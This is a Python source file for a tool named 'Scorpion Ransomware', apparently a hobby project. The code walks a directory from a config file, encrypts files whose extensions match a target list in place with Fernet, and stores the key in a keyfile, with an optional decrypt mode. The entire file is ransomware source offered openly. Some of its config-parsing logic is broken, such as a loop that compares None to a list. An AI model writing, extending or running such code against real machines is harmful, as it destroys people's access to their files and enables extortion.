import os
from os.path import expanduser
from cryptography.fernet import Fernet
import argparse

target_dir = ""
target_ext = []
target_keyfile = ""

class Ransomware:
	
	def __init__(self):
		self.key = None
		self.cryptor = None
		self.file_ext_targets = target_ext
	
	def generate_key(self):
		
		self.key = Fernet.generate_key()
		self.cryptor = Fernet(self.key)
	
	def read_key(self, keyfile_name):
		with open(keyfile_name, 'rb') as f:
			self.key = f.read()
			self.cryptor = Fernet(self.key)
	
	def write_key(self, keyfile_name):
		with open(keyfile_name, 'wb') as f:
			f.write(self.key)
	
	def crypt_root(self, root_dir, encrypted = False):
		for root, _, files in os.walk(root_dir):
			for f in files:
				abs_file_path = os.path.join(root, f)
				
				if not abs_file_path.split('.')[-1] in self.file_ext_targets:
					continue
				
				self.crypt_file(abs_file_path, encrypted = encrypted)
	
	def crypt_file(self, file_path, encrypted = False):
		with open(file_path, 'rb+') as f:
			_data = f.read()
			
			if not encrypted:
				data = self.cryptor.encrypt(_data)
			else:
				f.truncate(0)
				data = self.cryptor.decrypt(_data)
			
			f.seek(0)
			f.write(data)

if __name__ == '__main__':
	with open("scorpion.cfg") as s:
		data = s.read()
		target_dir = data.split("\n")[0]
		target_ext = data.split("\n")[1]
		target_keyfile = data.split("\n")[2]
		dt_count = 1
		dt = None
		while(dt == data.split(" ")):
			target_ext += dt[dt_count]
			dt_count += 1
	
	local_root = target_dir
	parser = argparse.ArgumentParser()
	parser.add_argument('-v', '--version', action='version', version='Scorpion Ransomware 1.0.4.7', help="Show program's version number and exit.")
	parser.add_argument('-a', metavar = '<encrypt|decrypt>', help = 'Define action to do')
	args = parser.parse_args()
	action = args.a
	
	rware = Ransomware()
	
	if action == 'decrypt':
		canDecrypt = True
		with open(target_keyfile) as f:
			if(f.read() == ""):
				canDecrypt = False
			else:
				canDecrypt = True
		if(canDecrypt == True):
			rware.read_key(target_keyfile)
			rware.crypt_root(local_root, encrypted = True)
			with open(target_keyfile, 'wb') as k:
				k.truncate(0)
		elif(canDecrypt == False):
			print("[!]: The keyfile is empty, the files can't be decrypted!")
			quit()
	elif action == 'encrypt':
		rware.generate_key()
		rware.write_key(target_keyfile)
		rware.crypt_root(local_root)
	else:
		print("           ===========================")
		print("           ===     Scorpion 1.0    ===")
		print(" 	   ===  Script Version 1.4 ===")
		print(" 	   ===     Python 3.7.4    ===")
		print(" 	   ===========================")
		print(" 	   === Created By Pippopad ===")
		print(" 	   ===========================")
		print(" 	   ===========================")
		print("\n\n[*] Usage: python scorpion.py [-h]\n")
		quit()

print("[*] Done!")
